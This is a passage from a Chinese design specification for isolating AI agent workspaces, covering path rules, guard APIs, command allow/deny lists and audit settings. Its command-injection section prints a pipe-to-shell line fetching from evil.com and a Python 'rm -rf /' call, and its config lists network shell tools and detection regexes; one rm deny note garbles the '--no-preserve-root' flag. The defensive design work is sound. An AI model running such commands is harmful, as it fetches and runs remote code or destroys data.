#### 4.10.2 目录列表过滤规则

| 规则 | 说明 | 优先级 |
|------|------|--------|
| 返回结果过滤 | 只返回有权限访问的子项 | P0 |
| 隐藏禁止目录 | 不在结果中显示禁止目录 | P0 |
| 隐藏敏感目录 | 不显示 `.ssh`, `.gnupg` 等 | P0 |

#### 4.10.3 目录列表安全需求

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.10.3-01 | 返回结果只包含有权限访问的子项 | P0 |
| FR-4.10.3-02 | 禁止目录不在结果中显示 | P0 |
| FR-4.10.3-03 | 敏感目录（.ssh 等）默认隐藏 | P0 |
| FR-4.10.3-04 | 目录存在性探测防护 | P1 |

### 4.11 临时文件与自动创建目录

#### 4.11.1 问题场景

- `write_to_file` 会自动创建父目录
- 临时目录使用混乱

#### 4.11.2 临时文件规则

| 规则 | 说明 | 优先级 |
|------|------|--------|
| 专用临时目录 | Agent 必须使用工作空间内的 `tmp/` 目录 | P0 |
| 禁止外部创建 | 禁止在工作空间外创建目录 | P0 |
| 自动清理 | 临时文件支持自动过期清理 | P1 |

#### 4.11.3 临时文件安全需求

| 需求 ID | 描述 | 优先级 |
|---------|------|--------|
| FR-4.11.3-01 | 临时文件必须位于工作空间内的 tmp/ 目录 | P0 |
| FR-4.11.3-02 | 禁止在工作空间外创建任何目录 | P0 |
| FR-4.11.3-03 | 临时文件支持 TTL 过期清理 | P1 |
| FR-4.11.3-04 | Workspace 销毁时清理所有临时文件 | P1 |

---

## 五、接口设计

### 5.1 WorkspaceManager API

```python
class WorkspaceManager:
    """工作空间管理器"""
    
    def create_workspace(
        self,
        agent_id: str,
        parent_workspace_id: Optional[str] = None,
        permissions: Permission = Permission.READ | Permission.LIST,
    ) -> Workspace:
        """创建工作空间"""
        ...
    
    def get_workspace(self, agent_id: str) -> Optional[Workspace]:
        """获取 Agent 的工作空间"""
        ...
    
    def validate_path(
        self,
        agent_id: str,
        requested_path: str,
        required_permission: Permission,
    ) -> tuple[bool, str]:
        """验证路径访问权限"""
        ...
    
    def archive_workspace(self, workspace_id: str) -> bool:
        """归档工作空间"""
        ...
    
    def delete_workspace(self, workspace_id: str) -> bool:
        """删除工作空间"""
        ...
```

### 5.2 ExchangeService API

```python
class ExchangeService:
    """跨 Agent 文件交换服务"""
    
    async def push_file(
        self,
        from_agent_id: str,
        filename: str,
        content: bytes,
        authorized_agents: list[str],
        expires_in_seconds: int = 86400,  # 默认 24 小时
    ) -> FileReference:
        """
        推送文件到交换区
        返回: { exchange_id, expires_at }
        """
        ...
    
    async def pull_file(
        self,
        to_agent_id: str,
        exchange_id: str,
    ) -> Optional[FileContent]:
        """
        从交换区拉取文件
        返回: { filename, content } 或 None
        """
        ...
    
    async def cleanup_expired(self) -> int:
        """清理过期文件，返回清理数量"""
        ...
```

### 5.3 SharedAccessService API

```python
class SharedAccessService:
    """临时共享访问服务"""
    
    async def request_access(
        self,
        from_agent_id: str,
        to_agent_id: str,
        target_path: str,
        permissions: Permission,
        reason: str,
        expires_in_seconds: Optional[int] = None,
    ) -> SharedAccessRequest:
        """申请临时共享访问"""
        ...
    
    async def approve_request(
        self,
        request_id: str,
        approver_id: str,  # 用户 ID
    ) -> bool:
        """审批通过"""
        ...
    
    async def reject_request(
        self,
        request_id: str,
        rejector_id: str,
        reason: Optional[str] = None,
    ) -> bool:
        """审批拒绝"""
        ...
```

### 5.4 AgentContext 管理

```python
# 全局上下文管理（协程本地存储）
_current_context: ContextVar[Optional[AgentContext]]

def set_current_context(context: AgentContext) -> None:
    """设置当前执行上下文"""
    ...

def get_current_context() -> Optional[AgentContext]:
    """获取当前执行上下文"""
    ...

def get_current_workspace() -> Optional[Workspace]:
    """获取当前工作空间（快捷方法）"""
    ...
```

### 5.5 PathClassifier API

```python
class PathClassifier:
    """路径分类器"""
    
    def __init__(self, rules: list[PathClassification] = None):
        """初始化分类器，加载分类规则"""
        ...
    
    def classify(self, path: str) -> tuple[PathCategory, Policy]:
        """
        分类路径并返回策略
        返回: (category, policy)
        """
        ...
    
    def is_allowed(self, path: str) -> tuple[bool, Policy, str]:
        """
        判断路径是否允许访问
        返回: (allowed, policy, reason)
        """
        ...
    
    def matches_pattern(self, path: str, pattern: str) -> bool:
        """检查路径是否匹配模式（支持 glob）"""
        ...
```

### 5.6 TemporaryPermissionService API

```python
class TemporaryPermissionService:
    """临时权限服务"""
    
    def __init__(self, workspace_manager: WorkspaceManager):
        ...
    
    async def grant_permission(
        self,
        agent_id: str,
        path: str,
        permission: Permission,
        scope: TempPermissionScope,
        granted_by: str,
        task_id: Optional[str] = None,
        session_id: Optional[str] = None,
        expires_in_seconds: Optional[int] = None,
    ) -> TemporaryPermission:
        """
        授予临时权限
        """
        ...
    
    async def check_permission(
        self,
        agent_id: str,
        path: str,
        required_permission: Permission,
    ) -> tuple[bool, str]:
        """
        检查临时权限
        返回: (has_permission, reason)
        """
        ...
    
    async def revoke_permission(self, permission_id: str) -> bool:
        """撤销临时权限"""
        ...
    
    async def cleanup_expired(self) -> int:
        """清理过期权限，返回清理数量"""
        ...
    
    async def get_active_permissions(
        self,
        agent_id: Optional[str] = None,
    ) -> list[TemporaryPermission]:
        """获取活跃的临时权限"""
        ...
```

### 5.7 ConfirmationService API

```python
class ConfirmationService:
    """用户确认服务"""
    
    def __init__(
        self,
        temp_permission_service: TemporaryPermissionService,
        event_emitter: Any,  # 用于推送 WebSocket 事件
    ):
        ...
    
    async def request_confirmation(
        self,
        agent_id: str,
        path: str,
        operation: str,
        reason: str,
        task_id: Optional[str] = None,
    ) -> PendingConfirmation:
        """
        请求用户确认
        返回: PendingConfirmation 对象
        """
        ...
    
    async def approve(
        self,
        request_id: str,
        approver_id: str,
        scope: TempPermissionScope,
        permanent_path: bool = False,  # 是否永久加入白名单
    ) -> TemporaryPermission:
        """
        批准确认请求
        """
        ...
    
    async def reject(
        self,
        request_id: str,
        rejector_id: str,
        reason: Optional[str] = None,
    ) -> bool:
        """拒绝确认请求"""
        ...
    
    def get_pending_requests(
        self,
        agent_id: Optional[str] = None,
    ) -> list[PendingConfirmation]:
        """获取待确认请求列表"""
        ...
    
    async def wait_for_confirmation(
        self,
        request_id: str,
        timeout_seconds: float = 60.0,
    ) -> ConfirmationResult:
        """
        等待用户确认（用于异步流程）
        超时返回 TIMEOUT
        """
        ...
```

### 5.8 ExecutionGuard API

```python
class ExecutionGuard:
    """命令执行守卫"""
    
    def __init__(self, config: ExecutionConfig):
        ...
    
    def validate_command(
        self,
        command: str,
        agent_id: Optional[str] = None,
    ) -> tuple[bool, str]:
        """
        验证命令是否允许执行
        返回: (allowed, reason)
        """
        ...
    
    def sanitize_environment(
        self,
        env: dict[str, str],
    ) -> dict[str, str]:
        """
        清理危险环境变量
        返回: 清理后的环境变量
        """
        ...
    
    def validate_working_directory(
        self,
        cwd: str,
        workspace_root: Path,
    ) -> tuple[bool, str]:
        """
        验证工作目录是否在允许范围内
        返回: (allowed, reason)
        """
        ...
    
    def build_safe_command(
        self,
        command: str,
        workspace_root: Path,
    ) -> str:
        """
        构建安全的命令（添加路径限制等）
        """
        ...
```

### 5.9 SearchGuard API

```python
class SearchGuard:
    """搜索操作守卫"""
    
    def __init__(self, config: SearchConfig):
        ...
    
    def validate_search_path(
        self,
        path: str,
        workspace_root: Path,
    ) -> tuple[bool, str]:
        """
        验证搜索路径
        - 必须在工作空间内
        - 不能是根路径
        - HOME 目录必须展开
        返回: (allowed, reason)
        """
        ...
    
    def filter_results(
        self,
        results: list[Any],
        workspace_root: Path,
    ) -> list[Any]:
        """
        过滤搜索结果
        - 只返回在工作空间内的
        - 忽略禁止的目录
        - 限制结果数量
        """
        ...
    
    def should_ignore(
        self,
        path: Path,
    ) -> bool:
        """
        判断路径是否应该被忽略
        """
        ...
```

### 5.10 ListDirGuard API

```python
class ListDirGuard:
    """目录列表守卫"""
    
    def filter_results(
        self,
        items: list[dict],
        workspace_root: Path,
        permissions: Permission,
    ) -> list[dict]:
        """
        过滤目录列表结果
        - 只返回有权限访问的
        - 隐藏禁止目录
        - 隐藏敏感目录
        """
        ...
    
    def should_hide(
        self,
        item_name: str,
        item_path: Path,
    ) -> bool:
        """
        判断项目是否应该隐藏
        """
        ...
```

---

## 六、与安全模块集成

### 6.1 SecurityWorkspaceAdapter

```python
class SecurityWorkspaceAdapter:
    """
    安全模块适配器
    预留给 Firecracker 沙箱集成
    """
    
    def __init__(
        self,
        workspace_manager: WorkspaceManager,
        security_module: Any,  # 安全模块接口（待实现）
    ):
        self.workspace_manager = workspace_manager
        self.security_module = security_module
    
    async def register_workspace_with_security(
        self,
        workspace: Workspace,
        security_context: dict,
    ) -> bool:
        """
        向安全模块注册工作空间
        创建 Firecracker microVM 并关联工作空间
        """
        ...
    
    async def create_isolated_environment(
        self,
        workspace: Workspace,
        resources: dict,
    ) -> str:
        """
        创建隔离环境
        返回: sandbox_id
        """
        ...
    
    async def destroy_isolated_environment(
        self,
        sandbox_id: str,
    ) -> bool:
        """销毁隔离环境"""
        ...
```

### 6.2 Firecracker 集成点

| 集成点 | 说明 |
|--------|------|
| VM Pool | 预启动 VM，冷启动优化 |
| 9pfs/virtio-fs | Host 与 VM 间文件共享 |
| vsock | VM 与 Host 通信 |
| 资源配额 | CPU/MEM/IO 限制 |

---

## 七、实现优先级

| Phase | 需求 | 优先级 | 说明 |
|-------|------|--------|------|
| **Phase 1** | Workspace 数据模型 + WorkspaceManager | P0 | 基础组件 |
| **Phase 2** | AgentContext 管理 | P0 | 执行上下文 |
| **Phase 3** | WorkspaceGuard 装饰器 | P0 | 工具层拦截 |
| **Phase 4** | 审计日志 | P0 | 安全可追溯 |
| **Phase 5** | ExchangeService | P1 | 跨 Agent 协作 |
| **Phase 6** | 共享目录白名单 | P1 | 协作效率 |
| **Phase 7** | SecurityWorkspaceAdapter | P1 | 安全模块接口 |
| **Phase 8** | SharedAccessService（临时共享+审批） | P2 | 高级功能 |

---

## 八、文件结构

```
backend/src/
├── agent/
│   ├── __init__.py
│   ├── defs.py                 # 已存在
│   ├── manager.py              # 已存在
│   ├── registry.py             # 已存在
│   ├── runner.py               # 已存在（需集成 AgentContext）
│   ├── spawner.py              # 已存在
│   │
│   ├── workspace/              # 新增：工作空间模块
│   │   ├── __init__.py
│   │   ├── models.py           # 数据模型（Permission, Workspace 等）
│   │   ├── manager.py           # WorkspaceManager
│   │   ├── context.py          # AgentContext 管理
│   │   ├── guard.py            # WorkspaceGuard 装饰器
│   │   ├── validator.py        # 路径验证逻辑
│   │   ├── classifier.py       # PathClassifier 路径分类器
│   │   ├── temp_permission.py   # TemporaryPermissionService
│   │   └── audit.py            # 审计日志
│   │
│   ├── confirmation/            # 新增：用户确认模块
│   │   ├── __init__.py
│   │   ├── service.py          # ConfirmationService
│   │   └── models.py           # PendingConfirmation 等
│   │
│   ├── exchange/                # 新增：跨 Agent 交换
│   │   ├── __init__.py
│   │   ├── service.py          # ExchangeService
│   │   ├── models.py           # Exchange 元数据
│   │   └── storage.py          # 交换区存储
│   │
│   ├── shared/                 # 新增：共享访问
│   │   ├── __init__.py
│   │   ├── service.py          # SharedAccessService
│   │   └── models.py           # 共享请求模型
│   │
│   ├── security/               # 新增：安全模块集成
│   │   ├── __init__.py
│   │   └── adapter.py          # SecurityWorkspaceAdapter
│   │
│   └── tools/
│       ├── file_tools.py       # 已存在（需集成 WorkspaceGuard）
│       └── ...
│
└── tests/
    └── agent/
        ├── workspace/
        │   ├── test_manager.py
        │   ├── test_guard.py
        │   ├── test_context.py
        │   └── test_classifier.py
        ├── confirmation/
        │   └── test_service.py
        ├── exchange/
        │   └── test_service.py
        └── shared/
            └── test_service.py
```

---

## 九、风险与约束

### 已识别风险

| 风险/约束 | 说明 | 缓解措施 | 优先级 |
|-----------|------|----------|--------|
| **符号链接绕过** | 恶意 Agent 可能通过符号链接访问禁止目录 | WorkspaceGuard 中对所有路径调用 resolve() 并验证 | P0 |
| **路径解析竞争** | TOCTOU（Time-of-check to time-of-use）问题 | 验证和操作在同一原子操作内完成 | P0 |
| **命令注入** | Agent 通过命令参数注入恶意代码 | 命令参数白名单校验，禁止危险字符 | P0 |
| **环境变量注入** | 通过 LD_PRELOAD 等环境变量注入恶意代码 | 执行前清理危险环境变量 | P0 |
| **工作目录逃逸** | 子进程 cd 到禁止目录后执行操作 | 锁定工作目录，验证所有 cd 操作 | P0 |
| **搜索放大攻击** | 递归搜索暴露禁止目录内容 | 搜索必须在工作空间内，限制结果数量 | P0 |
| **目录探测** | list_dir 暴露禁止目录存在性 | 过滤返回结果，只显示有权限的项目 | P0 |
| **Firecracker 依赖** | 本模块依赖安全模块实现 | Phase 7 集成，提供 Mock 接口供前期开发 | P1 |
| **性能开销** | 每次工具调用增加路径验证 | 缓存验证结果，优化 hot path | P1 |
| **存量 Agent 兼容** | 已有 Agent 定义可能未配置 workspace | 自动创建默认工作空间，继承父 Agent 配置 | P1 |
| **权限滥用** | 用户批准后 Agent 做超出范围的事 | 要求说明意图，记录完整审计链 | P1 |
| **并发竞争** | 多 Agent 并发操作同一文件 | 可选的文件锁机制 | P2 |

### TOCTOU 防护措施

```
问题：验证路径后、实际访问前，路径可能被修改

场景：
1. Agent 请求访问 /ws/agent/file.txt
2. 系统验证：路径合法，允许访问
3. 攻击者将 file.txt 替换为符号链接 → /etc/passwd
4. Agent 实际访问：读取到 /etc/passwd

防护方案：
┌─────────────────────────────────────────────────────────────┐
│                    原子操作执行                               │
│                                                              │
│   方案 A：openat + O_NOFOLLOW                               │
│   - 使用带 O_NOFOLLOW 标志的 openat 系统调用                 │
│   - 符号链接不会被跟随                                      │
│                                                              │
│   方案 B：seccomp + whitelist                               │
│   - 限制可用的系统调用                                       │
│   - 只允许 openat, read, write 等必要调用                    │
│                                                              │
│   方案 C：容器隔离（Firecracker）                            │
│   - Agent 运行在独立 VM 中                                   │
│   - 路径隔离在 VM 级别保证                                   │
└─────────────────────────────────────────────────────────────┘
```

### 命令注入防护示例

```
危险命令：
curl http://evil.com/script.sh | bash
python -c 'import os; os.system("rm -rf /")'

防护措施：
┌─────────────────────────────────────────────────────────────┐
│  1. 命令解析 + 白名单校验                                   │
│                                                              │
│  命令: curl http://evil.com/script.sh | bash                │
│  解析: ["curl", "http://evil.com/script.sh", "|", "bash"]  │
│  检查: curl ✓, bash ✗ (禁止)                                │
│  结果: 拒绝执行                                              │
├─────────────────────────────────────────────────────────────┤
│  2. 参数危险模式检测                                         │
│                                                              │
│  危险模式:                                                   │
│  - 管道符 (|) 后跟命令                                       │
│  - 分号 (;) 分隔命令                                         │
│  - 反引号 (`) 命令替换                                       │
│  - $() 命令替换                                             │
│  - &&, || 逻辑运算符                                        │
│  - ; rm -rf /                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## 十、测试策略

| 测试类型 | 覆盖率目标 | 说明 |
|----------|------------|------|
| 单元测试 | ≥ 80% | WorkspaceManager、ExchangeService 等核心组件 |
| 集成测试 | - | 与 Agent Runner 的集成 |
| 安全测试 | - | 路径穿越、权限绕过场景 |
| 性能测试 | - | 验证开销在可接受范围 |

---

## 十一、后续迭代

以下功能在后续版本中考虑：

1. **Session 与 Workspace 绑定**：多任务场景下的工作空间切换
2. **Workspace 模板**：预定义目录结构的工作空间模板
3. **Workspace 快照**：支持工作空间版本管理和回滚
4. **Firecracker 完整集成**：生产级沙箱支持
5. **实时监控 Dashboard**：工作空间使用情况可视化

---

## 附录 A：配置项

### A.1 工作空间配置 (workspace)

```yaml
workspace:
  # 开关
  enabled: true                      # 是否启用工作空间隔离

  # 目录配置
  root_path: "/storage/ws"           # Agent 工作空间根目录
  exchange_path: "/storage/exchange" # 跨 Agent 文件交换目录
  shared_path: "/storage/shared"     # 共享白名单目录
  audit_path: "/storage/audit"      # 审计日志目录
  temp_path: "/tmp/dpsk"            # 系统临时目录（用于临时文件）

  # 默认权限
  default_permissions:
    regular: ["READ", "LIST"]        # 普通 Agent 默认权限
    admin: ["READ", "WRITE", "LIST", "DELETE"]  # 管理员 Agent 默认权限

  # 工作空间自动清理
  cleanup:
    enabled: true
    inactive_threshold_hours: 168   # 非活跃阈值：7 天后标记为非活跃
    auto_archive_days: 30            # 自动归档：30 天后归档
    auto_delete_days: 90             # 自动删除：90 天后删除
    cleanup_interval_hours: 24       # 清理检查间隔：24 小时
```

### A.2 交换区配置 (exchange)

```yaml
exchange:
  # 生命周期
  default_ttl_seconds: 86400         # 默认过期时间：24 小时
  max_ttl_seconds: 604800           # 最大过期时间：7 天
  cleanup_interval_seconds: 3600    # 清理检查间隔：1 小时

  # 存储限制
  max_file_size_mb: 100              # 单个文件最大：100 MB
  max_total_size_gb: 10             # 交换区总大小限制：10 GB
  max_files_per_agent: 100          # 单个 Agent 最大文件数

  # 访问控制
  allow_agent_self_exchange: false   # 允许 Agent 从自己交换区读取（不安全）
```

### A.3 路径分类配置 (path_classification)

```yaml
path_classification:
  # 默认分类规则
  rules:
    # Agent 工作空间 - 自动允许
    - pattern: "/storage/ws/*"
      category: "workspace"
      policy: "allow"

    # 共享白名单 - 自动允许
    - pattern: "/storage/shared/*"
      category: "shared"
      policy: "allow"

    # 用户主目录 - 需要确认
    - pattern: "/home/*"
      category: "user_home"
      policy: "allow_with_confirm"

    - pattern: "~/*"
      category: "user_home"
      policy: "allow_with_confirm"
      expand_home: true              # 自动展开 HOME 目录

    # 项目目录 - 需要确认
    - pattern: "/mnt/*"
      category: "project"
      policy: "allow_with_confirm"
    - pattern: "/workspace/*"
      category: "project"
      policy: "allow_with_confirm"

    # 系统目录 - 自动拒绝
    - pattern: "/etc/*"
      category: "system"
      policy: "deny"
    - pattern: "/usr/*"
      category: "system"
      policy: "deny"
    - pattern: "/var/*"
      category: "system"
      policy: "deny"

    # 敏感目录 - 自动拒绝
    - pattern: "/root/*"
      category: "sensitive"
      policy: "deny"
    - pattern: "/proc/*"
      category: "sensitive"
      policy: "deny"
    - pattern: "/sys/*"
      category: "sensitive"
      policy: "deny"
    - pattern: "/.ssh/*"
      category: "sensitive"
      policy: "deny"
    - pattern: "/.gnupg/*"
      category: "sensitive"
      policy: "deny"

    # 禁止目录 - 自动拒绝
    - pattern: "/"
      category: "forbidden"
      policy: "deny"
    - pattern: "/bin/*"
      category: "forbidden"
      policy: "deny"
    - pattern: "/sbin/*"
      category: "forbidden"
      policy: "deny"
    - pattern: "/boot/*"
      category: "forbidden"
      policy: "deny"
    - pattern: "/dev/*"
      category: "forbidden"
      policy: "deny"
    - pattern: "/lib/*"
      category: "forbidden"
      policy: "deny"
    - pattern: "/lib64/*"
      category: "forbidden"
      policy: "deny"

  # 规则匹配顺序
  match_order: "first"               # first: 首次匹配即停止, all: 收集所有匹配
```

### A.4 执行安全配置 (execution)

```yaml
execution:
  # 命令白名单（允许的命令）
  allowed_commands:
    # 版本控制
    - "git"
    - "git-*"

    # Python
    - "python"
    - "python*"
    - "pip"
    - "pip*"
    - "pip3"
    - "pyenv"

    # Node.js
    - "node"
    - "node*"
    - "npm"
    - "npm*"
    - "npx"
    - "yarn"

    # 包管理
    - "apt"
    - "apt-*"
    - "yum"
    - "dnf"
    - "brew"

    # 文件操作
    - "ls"
    - "ll"
    - "la"
    - "cat"
    - "cp"
    - "mv"
    - "mkdir"
    - "touch"
    - "head"
    - "tail"
    - "less"
    - "more"

    # 系统工具
    - "ps"
    - "df"
    - "du"
    - "free"
    - "top"
    - "htop"
    - "uname"
    - "whoami"
    - "id"
    - "pwd"
    - "cd"
    - "stat"

    # 搜索工具
    - "grep"
    - "find"
    - "which"
    - "whereis"
    - "rg"              # ripgrep
    - "fd"             # fd 文件查找

    # 文本处理
    - "sed"
    - "awk"
    - "sort"
    - "uniq"
    - "wc"
    - "cut"
    - "tr"
    - "jq"

    # 编译/构建
    - "gcc"
    - "g++"
    - "make"
    - "cmake"
    - "cargo"
    - "rustc"

    # 其他
    - "tar"
    - "gzip"
    - "gunzip"
    - "zip"
    - "unzip"

  # 命令黑名单（禁止的命令）
  denied_commands:
    # 网络下载
    - "curl"
    - "wget"
    - "fetch"
    - "lynx"
    - "w3m"

    # 网络工具
    - "nc"
    - "ncat"
    - "netcat"
    - "socat"
    - "ssh"
    - "scp"
    - "sftp"
    - "ftp"
    - "telnet"
    - "rlogin"
    - "rexec"

    # Shell
    - "bash"
    - "sh"
    - "zsh"
    - "fish"
    - "csh"
    - "tcsh"
    - "dash"
    - "ksh"
    - "sh"
    - "ash"

    # 磁盘操作
    - "dd"
    - "fdisk"
    - "mkfs"
    - "mke2fs"
    - "mount"
    - "umount"

    # 系统修改
    - "chmod"
    - "chown"
    - "chgrp"
    - "useradd"
    - "userdel"
    - "passwd"
    - "su"
    - "sudo"

    # 进程控制
    - "kill"
    - "killall"
    - "pkill"
    - "killall5"

    # 删除命令（危险）
    - "rm"
      reason: "禁止 rm，仅允许带 --no-preserve-root 的受限版本"
    - "rmdir"

  # 危险参数模式检测
  dangerous_patterns:
    - pattern: "\\|\\s*(bash|sh|zsh|fish)"
      description: "管道后跟 shell"
    - pattern: ";\\s*(rm|del|format)"
      description: "分号后跟危险命令"
    - pattern: "`.*`"
      description: "反引号命令替换"
    - pattern: "\\$\\(.*\\)"
      description: "$() 命令替换"
    - pattern: "&&\\s*(rm|del)"
      description: "&& 后跟删除命令"
    - pattern: "\\|\\s*curl"
      description: "管道下载执行"
    - pattern: "import\\s+os"
      description: "Python os 模块导入"
    - pattern: "import\\s+subprocess"
      description: "Python subprocess 模块导入"
    - pattern: "os\\.system"
      description: "Python os.system 调用"
    - pattern: "subprocess\\.run"
      description: "Python subprocess.run 调用"

  # 执行限制
  limits:
    timeout_seconds: 60               # 默认超时：60 秒
    max_timeout_seconds: 300        # 最大超时：5 分钟
    max_output_size_kb: 1024         # 最大输出：1 MB
    max_error_size_kb: 64           # 最大错误输出：64 KB

  # 环境变量清理
  cleanup_env_vars:
    - "LD_PRELOAD"
    - "LD_LIBRARY_PATH"
    - "PYTHONPATH"
    - "PERL5LIB"
    - "RUBYLIB"
    - "NODE_PATH"
    - "GOPATH"

  # 网络访问
  network:
    enabled: false                  # 默认禁止网络访问
    allowed_hosts: []              # 允许的主机（白名单）
    blocked_hosts: []             # 禁止的主机（黑名单）
    blocked_ports:
      - "1-1024"                   # 禁止系统端口
      - "3306"                     # MySQL
      - "5432"                     # PostgreSQL
      - "6379"                     # Redis
      - "27017"                    # MongoDB
```

### A.5 搜索安全配置 (search)

```yaml
search:
  # 搜索限制
  limits:
    max_results: 1000               # 单次搜索最大结果数
    max_file_size_mb: 10            # 单个文件最大大小（跳过更大的）
    max_depth: 50                   # 最大递归深度

  # 忽略的目录
  ignored_dirs:
    - ".git"
    - ".svn"
    - ".hg"
    - "node_modules"
    - "bower_components"
    - "__pycache__"
    - ".pytest_cache"
    - ".mypy_cache"
    - ".venv"
    - "venv"
    - "env"
    - ".env"
    - ".tox"
    - "dist"
    - "build"
    - ".eggs"
    - "*.egg-info"
    - ".next"
    - ".nuxt"
    - ".cache"
    - ".tmp"

  # 忽略的文件模式
  ignored_patterns:
    - "*.pyc"
    - "*.pyo"
    - "*.so"
    - "*.dll"
    - "*.dylib"
    - "*.o"
    - "*.a"
    - "*.iso"
    - "*.bin"
    - "*.img"
    - "*.class"
    - "*.jar"
    - "*.war"
    - "*.ear"

  # 忽略的二进制文件扩展名
  binary_extensions:
    - ".png"
    - ".jpg"
    - ".jpeg"
    - ".gif"
    - ".bmp"
    - ".ico"
    - ".svg"
    - ".pdf"
    - ".zip"
    - ".tar"
    - ".gz"
    - ".bz2"
    - ".7z"
    - ".rar"
    - ".mp3"
    - ".mp4"
    - ".avi"
    - ".mov"
    - ".wmv"
    - ".exe"
    - ".dll"
    - ".so"
```

### A.6 目录列表安全配置 (list_dir)

```yaml
list_dir:
  # 隐藏的目录
  hidden_dirs:
    # 禁止显示的
    - ".ssh"
    - ".gnupg"
    - ".aws"
    - ".docker"
    - ".kube"
    - ".vnc"
    - ".pki"

  # 隐藏的文件
  hidden_files:
    - ".bash_history"
    - ".zsh_history"
    - ".mysql_history"
    - ".psql_history"
    - ".gitconfig"
    - ".netrc"
    - ".npmrc"
    - ".pypirc"

  # 返回限制
  limits:
    max_items: 10000                # 单次返回最大条目数
    max_depth: 20                  # 最大显示深度

  # 排序
  sort_by: "name"                  # name, size, type, modified
  sort_order: "asc"               # asc, desc
```

### A.7 审计配置 (audit)

```yaml
audit:
  enabled: true                    # 是否启用审计

  # 日志配置
  logging:
    format: "jsonl"                # jsonl, json, plain
    path: "/storage/audit"
    filename_pattern: "audit_{date}.log"  # 按日期分文件
    rotation:
      max_size_mb: 100            # 单文件最大大小
      max_age_days: 90            # 保留天数
      max_backups: 10            # 保留备份数

  # 记录内容
  include:
    successful_access: true       # 记录成功的访问
    denied_access: true           # 记录被拒绝的访问
    permission_grants: true       # 记录权限授予
    permission_revocations: true  # 记录权限撤销
    command_execution: true       # 记录命令执行
    command_output: false          # 是否记录命令输出（可能很大）
    exchange_operations: true     # 记录交换操作

  # 敏感信息处理
  masking:
    enabled: true
    patterns:
      - name: "password"
        pattern: "(?i)(password|passwd|pwd)[=:][^\\s]+"
        replacement: "***MASKED***"
      - name: "api_key"
        pattern: "(?i)(api[_-]?key|apikey)[=:][^\\s]+"
        replacement: "***MASKED***"
      - name: "token"
        pattern: "(?i)(token|bearer|auth)[=:][^\\s]+"
        replacement: "***MASKED***"
```

### A.8 临时权限配置 (temporary_permission)

```yaml
temporary_permission:
  # 默认有效期
  defaults:
    one_time: true                 # 单次权限默认立即过期
    task_scope_seconds: 3600      # 任务内权限默认：1 小时
    session_scope_seconds: 86400  # 会话内权限默认：24 小时

  # 限制
  limits:
    max_per_agent: 50             # 单个 Agent 最大临时权限数
    max_per_path: 10             # 单个路径最大授权数
    max_task_scope_seconds: 86400 # 任务权限最大：24 小时
    max_session_scope_seconds: 604800  # 会话权限最大：7 天

  # 自动清理
  cleanup:
    check_interval_seconds: 300    # 检查间隔：5 分钟
    remove_on_expire: true        # 过期后自动移除
```

### A.9 用户确认配置 (confirmation)

```yaml
confirmation:
  # 超时设置
  timeout:
    default_seconds: 120          # 默认超时：2 分钟
    max_seconds: 600              # 最大超时：10 分钟
    reminder_seconds: 60          # 提醒间隔：1 分钟

  # 提示信息
  messages:
    title: "Agent 权限申请"
    requesting: "🤖 Agent「{agent_id}」申请访问工作空间外的路径"
    path_label: "📄 路径"
    operation_label: "📖 操作"
    risk_label: "📊 风险"
    reason_label: "💡 分析"

  # 确认选项
  options:
    allow_once: "🟢 允许本次"
    allow_task: "🟡 允许任务内"
    allow_session: "🟠 允许会话内"
    allow_permanent: "🔵 加入白名单"
    reject: "🔴 拒绝"

  # 风险等级映射
  risk_levels:
    workspace: "低"
    shared: "低"
    user_home: "中"
    project: "中"
    system: "高"
    sensitive: "高"
    forbidden: "极高"
```

### A.10 Agent 级配置覆盖

单个 Agent 可以通过 YAML frontmatter 覆盖默认配置：

```yaml
---
name: 行政助理
workspace:
  permissions: ["READ", "WRITE", "LIST", "DELETE"]
execution:
  allowed_commands:
    - "git"
    - "python"
    - "node"
    - "apt"        # 额外允许 apt
search:
  limits:
    max_results: 2000  # 额外放宽限制
---
```

### A.11 环境变量配置

| 环境变量 | 说明 | 默认值 |
|----------|------|--------|
| `DPSK_WORKSPACE_ENABLED` | 启用工作空间 | `true` |
| `DPSK_WORKSPACE_ROOT` | 工作空间根目录 | `/storage/ws` |
| `DPSK_EXECUTION_ENABLED` | 启用执行安全 | `true` |
| `DPSK_EXECUTION_TIMEOUT` | 默认超时秒数 | `60` |
| `DPSK_AUDIT_ENABLED` | 启用审计 | `true` |
| `DPSK_AUDIT_PATH` | 审计日志路径 | `/storage/audit` |

---

## 附录 B：错误码

### 工作空间错误码

| 错误码 | 说明 |
|--------|------|
| `WORKSPACE_ACCESS_DENIED` | 访问被拒绝（路径超出范围） |
| `WORKSPACE_PERMISSION_DENIED` | 权限不足 |
| `WORKSPACE_NOT_FOUND` | 工作空间不存在 |
| `WORKSPACE_INVALID_PATH` | 无效的路径格式 |
| `WORKSPACE_SYMLINK_FORBIDDEN` | 符号链接穿越边界 |
| `WORKSPACE_FORBIDDEN_PATH` | 禁止访问的路径类型 |

### 用户确认错误码

| 错误码 | 说明 |
|--------|------|
| `PATH_REQUIRES_CONFIRMATION` | 路径需要用户确认 |
| `CONFIRMATION_TIMEOUT` | 用户确认超时 |
| `CONFIRMATION_REJECTED` | 用户拒绝确认 |

### 临时权限错误码

| 错误码 | 说明 |
|--------|------|
| `TEMP_PERMISSION_EXPIRED` | 临时权限已过期 |
| `TEMP_PERMISSION_NOT_FOUND` | 临时权限不存在 |
| `TEMP_PERMISSION_REVOKED` | 临时权限已被撤销 |

### 交换区错误码

| 错误码 | 说明 |
|--------|------|
| `EXCHANGE_ACCESS_DENIED` | 交换文件访问被拒绝 |
| `EXCHANGE_NOT_FOUND` | 交换文件不存在 |
| `EXCHANGE_EXPIRED` | 交换文件已过期 |

### 执行安全错误码

| 错误码 | 说明 |
|--------|------|
| `COMMAND_DENIED` | 命令被禁止执行 |
| `COMMAND_NOT_IN_WHITELIST` | 命令不在白名单中 |
| `COMMAND_DANGEROUS_PATTERN` | 命令包含危险参数 |
| `EXECUTION_TIMEOUT` | 命令执行超时 |
| `EXECUTION_OUTPUT_TOO_LARGE` | 执行输出超出限制 |
| `NETWORK_ACCESS_DENIED` | 网络访问被禁止 |

### 搜索安全错误码

| 错误码 | 说明 |
|--------|------|
| `SEARCH_PATH_INVALID` | 搜索路径无效 |
| `SEARCH_ROOT_FORBIDDEN` | 禁止搜索根路径 |
| `SEARCH_RESULTS_EXCEEDED` | 搜索结果超出限制 |

---

> **文档版本历史**:
> - v1.0.6 (2026-04-23): 初始版本
